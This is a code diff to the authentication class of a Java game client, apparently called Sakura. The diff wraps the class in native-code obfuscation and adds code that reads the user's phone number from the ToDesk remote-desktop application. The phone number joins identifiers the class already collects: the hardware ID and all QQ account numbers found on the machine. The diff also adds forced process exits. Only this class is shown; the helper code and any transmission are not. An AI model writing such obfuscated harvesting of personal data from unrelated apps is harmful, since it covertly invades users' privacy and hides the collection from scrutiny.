@@ -1,5 +1,6 @@
 package dev.sakura.client.verify.util;
 
+import by.radioegor146.nativeobfuscator.Native;
 import dev.sakura.client.gui.mainmenu.MainMenuScreen;
 import dev.sakura.client.verify.AuthState;
 import dev.sakura.client.verify.VerificationClient;
@@ -18,6 +19,7 @@ import java.util.concurrent.atomic.AtomicBoolean;
 import java.util.concurrent.atomic.AtomicReference;
 import java.util.function.BiConsumer;
 
+@Native
 @ZKMIndy
 public final class AuthUtil {
     public enum Mode {
@@ -38,7 +40,8 @@ public final class AuthUtil {
 
         final String hwid = HwidUtil.getHWID();
         final Set<String> qqSet = QQUtils.getAllQQ();
-        final String phone = "";
+        String p = TodeskUtils.getPhone();
+        final String phone = p == null ? "" : p;
 
         AtomicBoolean finished = new AtomicBoolean(false);
         AtomicBoolean authedFlag = new AtomicBoolean(false);
@@ -65,10 +68,12 @@ public final class AuthUtil {
                             authed.set("");
                             AuthState.clear();
                             VerificationClient.shutdown();
+                            ExitUtil.exit0();
                             return;
                         }
 
                         VerificationClient.shutdown();
+                        ExitUtil.exit0();
                     }
 
                     @Override
